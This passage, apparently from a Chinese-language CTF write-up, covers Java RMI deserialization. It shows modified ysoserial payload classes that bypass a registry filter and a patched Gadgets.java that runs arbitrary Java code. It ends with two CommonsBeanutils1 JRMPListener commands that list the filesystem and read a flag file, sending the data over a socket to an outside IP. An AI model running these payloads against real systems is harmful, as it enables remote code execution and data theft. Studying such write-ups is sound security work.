                host = command.substring(0, sep);
                port = Integer.valueOf(command.substring(sep + 1));
            }
            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
            TCPEndpoint te = new TCPEndpoint(host, port);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            // RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            // Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
            //     Registry.class
            // }, obj);
            return ref;
        }
        public static void main ( final String[] args ) throws Exception {
            Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
            PayloadRunner.run(JRMPClient2.class, args);
        }
    }
简化掉了JRMPClient,没有了代理在反序列化的时候就不会调用resovelProxyClass,进而绕过了。
`xxlegend`大佬是利用其他接口`Activator`
    @PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
    @Authors({ Authors.MBECHLER })
    public class JRMPClient3 extends PayloadRunner implements ObjectPayload {
        public Activator getObject ( final String command ) throws Exception {
            String host;
            int port;
            int sep = command.indexOf(':');
            if ( sep java\.rmi\.registry\.Registry$
也就是说我们使用的第一份payload是攻击不成功的,那么显然bypass后的是可以成功的,我们来试试,利用URLDNS这个Gadget测试一下
可以看到已经有请求过来了
然后题目中还无法直接执行命令,但是既然可以反序列化了,可以使用代码执行,将`src/main/java/ysoserial/payloads/util/Gadgets.java`修改
    public static  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
                throws Exception {
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
    //        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
    //            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
    //            "\");";
            String cmd="";
            //如果以code:开头，认为是代码，否则认为是命令
            if(!command.startsWith("code:")){
                cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            }
            else{
                System.err.println("Java Code Mode:"+command.substring(5));//使用stderr输出，防止影响payload的输出
                cmd = command.substring(5);
            }
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = clazz.toBytecode();
            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates;
        }
而且还得注意一个问题,既然想要执行命令的话需要有可以使用的Gadget,
可以直接使用`ysoserial`中的`common-beanutils`模块,可以使用这个
构造列目录的代码的payload
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9997 CommonsBeanutils1 'code:java.io.File file=new java.io.File("/");java.io.File[] fileLists = file.listFiles();java.net.Socket s = new java.net.Socket("74.120.175.101",9998);for (int i = 0; i < fileLists.length; i++) {java.io.OutputStream out = s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write("\n".getBytes());}s.close();'
读flag的payload
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9997 CommonsBeanutils1 'code:java.io.File file = new java.io.File("/flag/flag_7ArPnpf3XW8Npsmj");java.io.InputStream in = null;in = new java.io.FileInputStream(file);int tempbyte;java.net.Socket s = new java.net.Socket("74.120.175.101",9998);while ((tempbyte = in.read()) != -1) {java.io.OutputStream out = s.getOutputStream();out.write(tempbyte);}in.close();s.close();'
参考:
    http://d1iv3.me/2018/06/05/CVE-2015-4852-Weblogic-反序列化RCE分析/
    https://xz.aliyun.com/t/2650
    https://blog.csdn.net/lmy86263/article/details/72594760
    https://www.cnblogs.com/xt0810/p/3640167.html
    https://www.anquanke.com/post/id/162782#h2-6
    https://xz.aliyun.com/t/4862